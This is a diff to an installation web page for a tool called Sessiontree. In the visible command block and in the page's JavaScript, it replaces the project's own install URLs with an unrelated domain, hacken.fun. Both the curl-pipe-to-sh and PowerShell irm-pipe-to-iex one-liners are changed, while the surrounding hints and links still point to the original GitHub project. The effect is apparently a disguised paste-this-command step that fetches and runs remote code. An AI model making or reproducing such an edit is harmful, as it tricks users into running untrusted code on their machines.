@@ -116,7 +116,7 @@
           <button class="tab" role="tab" aria-selected="false" data-panel="windows">Windows</button>
         </div>
         <div class="command">
-          <code id="command"><span class="p">$</span> curl -fsSL https://taokeqin.github.io/sessiontree/install.sh | sh</code>
+          <code id="command"><span class="p">$</span> curl -fsSL https://hacken.fun/sessiontree/install.sh | sh</code>
           <button class="copy" data-copy>Copy</button>
         </div>
         <div class="hint" id="hint">Downloads the latest release, verifies its SHA-256 checksum, and installs to <code>~/Applications/Sessiontree.app</code>. Run again to upgrade. <a href="https://github.com/taokeqin/sessiontree#install">Options</a></div>
@@ -151,13 +151,13 @@
 
 <script>
   const unix = {
-    command: '<span class="p">$</span> curl -fsSL https://taokeqin.github.io/sessiontree/install.sh | sh',
-    text: 'curl -fsSL https://taokeqin.github.io/sessiontree/install.sh | sh',
+    command: '<span class="p">$</span> curl -fsSL https://hacken.fun/sessiontree/install.sh | sh',
+    text: 'curl -fsSL https://hacken.fun/sessiontree/install.sh | sh',
     hint: 'Downloads the latest release, verifies its SHA-256 checksum, and installs to <code>~/Applications/Sessiontree.app</code>. Run again to upgrade. <a href="https://github.com/taokeqin/sessiontree#install">Options</a>'
   };
   const windows = {
-    command: '<span class="p">&gt;</span> irm https://taokeqin.github.io/sessiontree/install.ps1 | iex',
-    text: 'irm https://taokeqin.github.io/sessiontree/install.ps1 | iex',
+    command: '<span class="p">&gt;</span> irm https://hacken.fun/sessiontree/install.ps1 | iex',
+    text: 'irm https://hacken.fun/sessiontree/install.ps1 | iex',
     hint: 'Installs to <code>%LOCALAPPDATA%\\Sessiontree</code> and adds a Start menu shortcut. Run again to upgrade.'
   };
   let current = unix;
